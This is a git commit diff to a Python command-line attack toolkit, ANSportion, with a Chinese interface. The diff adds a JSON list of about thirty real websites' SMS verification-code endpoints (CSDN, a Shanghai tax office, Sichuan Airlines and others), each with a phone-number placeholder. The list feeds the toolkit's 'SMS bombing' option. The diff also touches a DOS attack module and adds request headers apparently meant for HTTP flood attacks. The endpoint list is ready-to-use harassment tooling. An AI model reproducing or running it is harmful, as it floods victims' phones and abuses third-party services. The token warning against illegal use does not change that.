b1a10726f8f53cd9ffb024b5c92d3fea490fc3e7
XXX-Stalker <2931727685@qq.com>
2025-04-20 11:42:49 +0800

    Update ANSportion.py

--- ANSportion.py
+++ ANSportion.py
@@ -6,6 +6,44 @@ import platform
 import random
 
 #所有初始化
+download_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Download file</title>
+</head>
+<body>
+    <h1>Welcome to the download page</h1>
+    <a href="/download">Download</a>
+</body>
+</html>"""
+
+target_html = """<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            text-align: justify;
+        }
+    </style>
+</head>
+<body>
+    <h1>Hello</h1>
+    <p>XXX_STALKER</p>
+</body>
+</html>"""
+
 plugins_tutorial = """欢迎 您 加入 ANSportion Plugins 计划。
 
 1. 首先我们需要一个引导文件，用于引导 ANSportion 去打开该引导文件的插件。
@@ -79,21 +117,377 @@ if __name__ == "__main__":
 5. 以上格式请严格遵循，否则 ANSportion 将无法识别该插件。
 
 欢迎所有创作者加入 ANSportion Plugins 计划。"""
+
+attack_2_API = """[
+    {
+        "url": "https://passport.csdn.net/v1/login/sendVerifyCode",
+        "headers": {
+            "Host": "passport.csdn.net",
+            "Content-Type": "application/json;charset=UTF-8",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36"
+        },
+        "payload": {
+            "code": "0086",
+            "platform": "WAP",
+            "type": "popupLogin",
+            "spm": "1001.2101.3001.7902",
+            "mobile": ""
+        }
+    },
+    {
+        "url": "https://zmingcx.com/wp-content/themes/begin/mail-captcha.php?0.17748457886315183",
+        "headers": {
+            "Host": "zmingcx.com",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36"
+        },
+        "payload": {
+            "action": "eer_captcha",
+            "email": "",
+            "user_name": "kisskdk"
+        }
+    },
+    {
+        "url": "https://shanghai.chinatax.gov.cn/jkfw/api/v1.0/services/ssqh/sendCrcByPhoneNum?phoneNum={mobile}",
+        "dynamic": true
+    },
+    {
+        "desc": "用户到家",
+        "url": "https://user.daojia.com/mobile/getcode?mobile=[phone]&newVersion=1&bu=112",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "小叶子app",
+        "url": "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=[phone]&country_code=86",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "人人文库",
+        "url": "https://www.renrendoc.com/Reg.aspx/GetUserSMSCode",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/json; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+            "X-Requested-With": "XMLHttpRequest"
+        },
+        "data": {
+            "userMobile": "[phone]"
+        }
+    },
+    {
+        "desc": "巨人网络",
+        "url": "https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=[phone]&mpcode=&pwd=&tname=&idcard=",
+        "method": "GET",
+        "header": {
+            "Referer": "https://reg.ztgame.com/",
+            "X-Requested-With": "XMLHttpRequest"
+        },
+        "data": ""
+    },
+    {
+        "desc": "金中网",
+        "url": "https://jrh.financeun.com/Login/sendMessageCode3.html?mobile=[phone]&mbid=197858&check=3",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "永城至敏",
+        "url": "http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&mobilePhone=[phone]&t=1589625247333action_type=regist&mobile=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "某数图表web(存疑)",
+        "url": "https://dycharts.com/vis/auth/send_signin_sms_code",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "phoneNo": "13809213237"
+        }
+    },
+    {
+        "desc": "加密电话",
+        "url": "https://m.4009991000.com/valNumQry.action",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "appType": "1",
+            "app_id": "5555",
+            "mobileNo": "[phone]",
+            "sig": "16cd52ea74f5ea4a6c2fe80b9a04f8b5",
+            "src": "1",
+            "v": "4.9.2",
+            "validType": "3"
+        }
+    },
+    {
+        "desc": "秘塔写作",
+        "url": "https://xiezuocat.com/verify?type=signup",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "phone": "86-[phone]"
+        }
+    },
+    {
+        "desc": "乐教乐学",
+        "url": "http://id.lejiaolexue.com/api/sendvericode.ashx?phone=[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "网心云APP",
+        "url": "https://account-box.onethingpcs.com/xluser.core.login/v3/sendsms",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "protocolVersion": "301",
+            "sequenceNo": "1000001",
+            "platformVersion": "10",
+            "isCompressed": "0",
+            "appid": "22017",
+            "clientVersion": "3.15.1",
+            "peerID": "00000000000000000000000000000000",
+            "appName": "ANDROID-com.onethingcloud.android",
+            "sdkVersion": "204500",
+            "devicesign": "div101.095893e2bfa13a199f83691076c8bbb9ab0d01f75c929975048142c2fa38402b",
+            "netWorkType": "WIFI",
+            "providerName": "NONE",
+            "deviceModel": "M2102J2SC",
+            "deviceName": "Xiaomi M2102j2sc",
+            "OSVersion": "11",
+            "creditkey": "",
+            "hl": "zh-CN",
+            "mobile": "[phone]",
+            "register": "0"
+        }
+    },
+    {
+        "desc": "费耘网",
+        "url": "https://www.feeclouds.com/homepage/register/send",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "mobile": "[phone]"
+        }
+    },
+    {
+        "desc": "广东省心理学会",
+        "url": "http://gpa-gd.scnu.edu.cn/member/index/public_send_code.html",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "phone": "[phone]"
+        }
+    },
+    {
+        "desc": "火象",
+        "url": "https://v1.alphazone-data.cn/academy/api/v1/sendsms",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "temp": "1",
+            "phone": "[phone]"
+        }
+    },
+    {
+        "desc": "麦克赛尔数字映像",
+        "url": "https://www.maxell-dm.cn/Code/CheckImage.aspx",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "action": "send",
+            "txtMember_Name": "[phone]"
+        }
+    },
+    {
+        "desc": "企米子",
+        "url": "https://www.xcxui.com/index/register/getcode.html",
+        "method": "POST",
+        "header": "",
+        "data": {
+            "tel": "[phone]"
+        }
+    },
+    {
+        "desc": "能链开放平台",
+        "url": "https://openplatformwsgateway.czb365.com/openplatformws/user/send/sendCheckMsgV7/[phone]",
+        "method": "GET",
+        "header": "",
+        "data": ""
+    },
+    {
+        "desc": "蘑菇云游",
+        "url": "https://www.moguyouxi.cn/Home/SendVerificationCode",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Referer": "https://www.moguyouxi.cn/"
+        },
+        "data": {
+            "phone": "[phone]",
+            "code": ""
+        },
+        "form": ""
+    },
+    {
+        "desc": "奇热漫画",
+        "url": "https://www.qiremanhua.com/passport/send_msg_code",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "https://www.qiremanhua.com/passport/reg/?redirectUri=%2F"
+        },
+        "data": {
+            "phone": "[phone]"
+        },
+        "form": ""
+    },
+    {
+        "desc": "好好住",
+        "url": "https://www.haohaozhu.cn/f/y/api/Login/Identifyingcode",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "https://www.haohaozhu.cn/"
+        },
+        "data": {
+            "phone": "[phone]",
+            "country_code":"86",
+            "identifying_type":"1"
+        },
+        "form": ""
+    },
+    {
+        "desc": "宜搜小说",
+        "url": "https://book.easou.com/ta/phonevcode.m",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "https://book.easou.com/ta/registerByPhone.m?backUrl=%2Fta%2Findex.m"
+        },
+        "data": {
+            "phone": "[phone]"
+        },
+        "form": ""
+    },
+    {
+        "desc": "泛付 PanPay",
+        "url": "https://www.panpay.com/e-bank/verifyPhoneCode.do",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+            "phone": "[phone]",
+            "tplType": "01",
+            "type": "BIND_PHONE",
+            "phoneCountry": "86"
+        },
+        "form": ""
+    },
+    {
+        "desc": "鳳凰金融",
+        "url": "https://www.fengwd.com/api/v2/user/loginRegister/captcha/text?version=1.0",
+        "method": "post",
+        "data": {
+            "mobile": "[phone]"
+        },
+        "header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+            "Referer": "https://www.fengwd.com/",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": "fjr_properties=%7B%22abtest%22%3A%22c%22%7D; _ga=GA1.2.1239566769.1689827740; _gid=GA1.2.1620323177.1689827740; _gat=1; Hm_lvt_cca0837a014621d8d933a0b1b2cb0be5=1689827740; Hm_lpvt_cca0837a014621d8d933a0b1b2cb0be5=1689827740; _ga_RQJV198NYX=GS1.2.1689827743.1.0.1689827743.0.0.0"
+        },
+        "form": ""
+    },
+    {
+        "desc": "四川航空",
+        "url": "https://flights.sichuanair.com/3uair/ibe/profile/processSendSMSNew.do?ConversationID=&smsType=REGISTER&mobilePhone=[phone]&verkey=MOBILELOGIN",
+        "method": "get",
+        "data": "",
+        "header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+            "Referer": "https://flights.sichuanair.com/3uair/ibe/profile/createProfile.do"
+        }
+    },
+    {
+        "desc": "安徽相亲网",
+        "url": "https://www.ahxiangqin.cn/index.php?c=picker&a=sendmobile",
+        "method": "post",
+        "data": {
+            "type": "reg",
+            "mobile": "[phone]",
+            "imgcode": "validcode",
+            "email": "[phone]",
+            "qq": "[phone]"
+        },
+        "header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+            "Referer": "https://www.ahxiangqin.cn/index.php?c=passport&a=reg",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        "form": ""
+    },
+    {
+        "desc": "印象笔记",
+        "url": "https://app.yinxiang.com/SendOneTimePassword.action?sig=b4d74d0018ad5084638ae1333f4c2a61&recipient=[phone]&textotp=",
+        "method": "get",
+        "data": "",
+        "header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+        }
+    }
+]"""
+
+cc_headers = """'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'"""
+
 def init_ANS_plugins():
     if not os.path.exists("plugins"):
         os.mkdir("plugins")
-    elif not os.path.exists("plugins/plugins_list.txt"):
+    
+    if not os.path.exists("plugins/plugins_list.txt"):
         with open("plugins/plugins_list.txt", 'w', encoding='utf-8') as file:
             file.write("")
-    elif not os.path.exists("plugins/plugins_tutorial.txt"):
+    
+    if not os.path.exists("plugins/plugins_tutorial.txt"):
         with open("plugins/plugins_tutorial.txt", 'w', encoding='utf-8') as file:
             file.write(plugins_tutorial)
-    else:
-        pass
+    
+    if not os.path.exists("attack_2_API.json"):
+        with open("attack_2_API.json", "w", encoding='utf-8') as file:
+            file.write(attack_2_API)
+    
+    if not os.path.exists("HTML_Code"):
+        os.mkdir("HTML_Code")
+    
+    if not os.path.exists("HTML_Code/target.html"):
+        with open("HTML_Code/target.html", 'w', encoding='utf-8') as file:
+            file.write(target_html)
+    
+    if not os.path.exists("HTML_Code/download.html"):
+        with open("HTML_Code/download.html", 'w', encoding='utf-8') as file:
+            file.write(download_html)
+    
+    if not os.path.exists("cc_headers.txt"):
+        with open("cc_headers.txt", 'w', encoding='utf-8') as file:
+            file.write(cc_headers)
+    
 system = platform.system()
 init_ANS_plugins()
 init()
-ANSportion_version = "1.1.8  -  Pro"
+ANSportion_version = "1.1.9  -  Pro"
+
+ANSportion_input_1 = "┌── ("
+ANSportion_input_2 = "ANSportion-PRO"
+ANSportion_input_3 = f") ~ [+ {system} +]\n└─ $ "
 
 #自定义导入文字
 ANSportion1_1 = """
@@ -122,9 +516,8 @@ ANSportion1_2 = '''
 '''
 
 ANSportion2 = f"""
-XXX_Stalker
 版本: {ANSportion_version}
-切记不可用于任何非法用途！！!"""
+切记不可用于任何非法用途！！！"""
 
 ANSportion3 = """注意!!!:
 需要联网，否则部分功能不能使用!
@@ -147,10 +540,10 @@ help = """
 help     ---   View Help                                          查看帮助
 exit     ---   exit the program                                   退出程序
 cls      ---   clear screen                                       清屏
+clear    ---   clear screen                                       清屏
 about    ---   About                                              关于我们
 log      ---   Check log                                          查看日志
 log all  ---   Check all log                                      查看所有日志
-open p   ---   Open end point                                     打开终端
 ----------------------------------------------------------------------
 plu      ---   plugins                                            插件
 check    ---   check                                              查看
@@ -303,18 +696,15 @@ server_help = """
 def program_code_body():
     while True:
         try:
-            program_input = input(Fore.MAGENTA + f'ANSportion-PRO [+ {system} +] <<' + Fore.RESET)
+            program_input = input(Fore.MAGENTA + ANSportion_input_1 + Fore.RED + ANSportion_input_2 + Fore.MAGENTA + ANSportion_input_3 + Fore.RESET)
             if program_input == "help":#系统指令 提供帮助
                 print(help)
             elif program_input == "exit":#系统指令 退出程序
                 sys.exit()
-            elif program_input == "cls":#系统指令 清屏
+            elif program_input in ["cls", "clear"]:#系统指令 清屏
                 os.system("cls" if os.name == 'nt' else 'clear')
             elif program_input == "about":#系统指令 关于我们
                 print(about)
-            elif program_input == "open p":#系统指令 调用系统对应终端
-                from Code.use_1 import use_1_main
-                use_1_main()
             elif program_input == "log":#查看更新日志
                 if os.path.exists("更新日志1.ans"):
                     with open("更新日志1.ans", 'r', encoding='utf-8') as file:
@@ -322,7 +712,7 @@ def program_code_body():
                     print(f"{'=' * 65}\n更新日志内容:")
                     print(log_content,f"\n{'=' * 65}")
                 else:
-                    print("更新日志文件不存在。")
+                    print("更新日志文件不存在")
             elif program_input == "log all":#查看所有的更新日志
                 if os.path.exists("更新日志2.ans"):
                     with open("更新日志2.ans", 'r', encoding='utf-8') as file:
@@ -330,7 +720,7 @@ def program_code_body():
                     print(f"{'=' * 65}\n更新日志内容:")
                     print(log_content, f"\n{'=' * 65}")
                 else:
-                    print("更新日志文件不存在。")
+                    print("更新日志文件不存在")
             elif program_input == "check l":#查看指定的库是否安装
                 check_l = input("请输入要检查的库名:")
                 import importlib.util
@@ -487,7 +877,7 @@ def program_code_body():
                 print(attack_help)
                 program_attack = input(":")
                 if program_attack == "1":#工具包指令 DOS攻击包
-                    from Code.attack_DOS import attack_dos_main
+                    from Code.attack_1 import attack_dos_main
                     attack_dos_main()
                 elif program_attack == "2":#工具包指令 短信轰炸
                     from Code.attack_2 import attack_2_main
@@ -593,6 +983,6 @@ if __name__ == "__main__":
         print(Fore.CYAN + f"更新日志1:\n{'=' * 65}\n更新日志内容:" + Fore.RESET)
         print(Fore.CYAN + log_content,f"\n{'=' * 65}" + Fore.RESET)
     else:
-        print("更新日志文件不存在")
+        print("日志文件不存在")
     print(ANSportion3)
     program_code_body()
